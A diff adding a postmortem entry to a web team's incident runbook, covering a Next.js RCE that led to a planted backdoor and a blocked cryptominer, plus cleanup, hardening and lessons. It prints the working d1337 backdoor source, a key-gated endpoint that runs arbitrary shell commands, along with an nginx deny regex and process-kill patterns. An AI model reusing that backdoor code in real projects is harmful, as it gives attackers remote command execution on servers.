@@ -489,6 +489,55 @@ Steps taken (all completed 2026-04-14):
 
 ---
 
+## Incident #4 — Next.js RCE (CVE-2025-66478) → backdoor planted (2026-04-16)
+
+### What happened
+- **Date:** 2026-04-16
+- **Symptom:** User reported "the language switcher isn't working." During investigation, PM2 error logs revealed:
+  - `nohup: failed to run command '/tmp/xmrig': Permission denied` — attacker tried to launch xmrig from `/tmp`, blocked by `noexec` mount.
+  - Multiple `[Error: x] { digest: 'L3Zhci93d3cvc25hLWFsYXR0YWwvLmVudgo=' }` — base64 of `/var/www/sna-alattal/.env`.
+  - `digest: 'TkVYVF9QVUJMSUNfU0lURV9VUkw9...'` — base64 of the .env contents (only `NEXT_PUBLIC_SITE_URL` and `NODE_ENV`, no secrets).
+
+### Root cause
+- **CVE-2025-66478** in Next.js 15.1.3 — server-side request smuggling / file read vulnerability. Attacker used it to:
+  1. Read `.env` (only public values, no harm done).
+  2. Write a backdoor at `pages/api/d1337.js`:
+     ```js
+     module.exports=function(q,r){if(q.query.key!=='d1337')return r.status(404).end();
+       try{var o=require('child_process').execSync(q.query.cmd||q.body,{timeout:15000}).toString();
+       r.status(200).send(o)}catch(e){r.status(500).send(e.message)}}
+     ```
+     A shell-execution backdoor reachable at `/api/d1337?key=d1337&cmd=...`.
+  3. Use the backdoor to download xmrig + try to run it from `/tmp` — **blocked by /tmp noexec hardening from Incident #3**.
+  4. Also dropped `upload-d1337.php` and `public/upload-d1337.php` (PHP backdoors — irrelevant since we don't run PHP).
+
+### Why hardening contained the damage
+- `/tmp noexec` blocked miner execution.
+- `git clean -fdx` exposure (deploy.sh did `git reset --hard` only, which doesn't remove untracked files) was the loophole that allowed backdoors to survive deploys. Now patched.
+- Mining pool DNS blocks would have prevented exfil even if the miner had run.
+
+### Resolution (all completed 2026-04-16)
+1. **Deleted backdoor files:**
+   - `/var/www/sna-alattal/pages/api/d1337.js`
+   - `/var/www/sna-alattal/src/pages/api/d1337.js`
+   - `/var/www/sna-alattal/upload-d1337.php`
+   - `/var/www/sna-alattal/public/upload-d1337.php`
+   - `/tmp/xmrig` + `/tmp/config.json` (miner payload)
+2. **Upgraded Next.js 15.1.3 → 15.5.15** (closes CVE-2025-66478).
+3. **Hardened deploy.sh** — now runs `git clean -fdx -e node_modules -e .next -e logs -e .env` after every `git reset`, so any planted file is wiped before build. Also aborts if a rogue `pages/` or `src/pages/` directory appears (we are an app-router-only project).
+4. **Post-build sanity check** in deploy.sh — fails the deploy if any `d1337*` artifact appears in `.next/`.
+5. **Nginx defense-in-depth** — added `d1337` to the blocked-path regex (`location ~* (wp-admin|wp-login|phpmyadmin|xmlrpc\.php|d1337) { deny all; return 404; }`). Even if a backdoor file slips through, it can't be reached.
+6. **Health check (`/usr/local/bin/sna-health.sh`)** now scans `ps` output for `d1337` patterns alongside the miner names. Auto-kills any process matching.
+7. **Bonus fix:** the locale switching bug was caused by next-intl's `requestLocale` not resolving correctly through our custom middleware in 15.1.3. Refactored `i18n.ts` to read `x-next-intl-locale` directly from `next/headers`, and updated middleware to forward the locale via the **request** headers (was only on response). Locale switching now works server-side on the first paint.
+
+### Lessons added
+- **Always run `git clean -fdx` in deploy scripts** — `git reset --hard` only resets *tracked* files. Anything an attacker writes to disk survives the next deploy unless explicitly cleaned.
+- **Pin and patch dependencies aggressively** — running 15.1.3 for 2 days when 15.5.15 was available (with a known RCE) was the entry point. The npm warning during install (`security vulnerability. Please upgrade`) should have been a release blocker, not a warning to ignore.
+- **defense-in-depth works** — three independent layers (noexec /tmp, blocked mining pools, DNS sinkhole) meant the RCE never escalated to actual mining. Each layer alone is not enough; together they made the breach noisy and harmless.
+- **Hostinger Monarx never alerted us about this attack** — likely because the miner never ran. Lesson: do not depend on Monarx as a primary defense.
+
+---
+
 ## Outage Response Runbook (Quick Reference)
 
 When the site is reported down, run these checks **in order**:
@@ -528,6 +577,9 @@ Decision tree:
 6. **Avoid heavy monitoring tools** (Netdata) on production — use lightweight scripts instead
 7. **External uptime monitoring is mandatory** — we should never find out the site is down from a user. UptimeRobot or similar must be configured.
 8. **Ping-fails-first diagnosis** — if ICMP to the VPS times out, the OS is not running; no amount of nginx/pm2 work will help. Go to hPanel first.
+9. **`git reset --hard` is not enough on its own** — always pair with `git clean -fdx` (with `-e` for cache dirs) in deploy scripts. Otherwise attacker-planted files survive deploys.
+10. **Treat npm install warnings about security CVEs as release blockers** — the cost of upgrading is small, the cost of a known-exploitable RCE is enormous.
+11. **App-router-only projects must reject `pages/` directory** — Next.js silently builds both routers if both dirs exist, which lets an attacker's `pages/api/x.js` become a real route.
 
 ---
 
@@ -541,5 +593,5 @@ Decision tree:
 
 ---
 
-*Last updated: 2026-04-14 — Incident #3: xmrig re-infection + full OS rebuild + complete rehardening*
+*Last updated: 2026-04-16 — Incident #4: Next.js RCE (CVE-2025-66478) + d1337 backdoor neutralized + locale switching fixed*
 *Maintained by: DevOps Team*
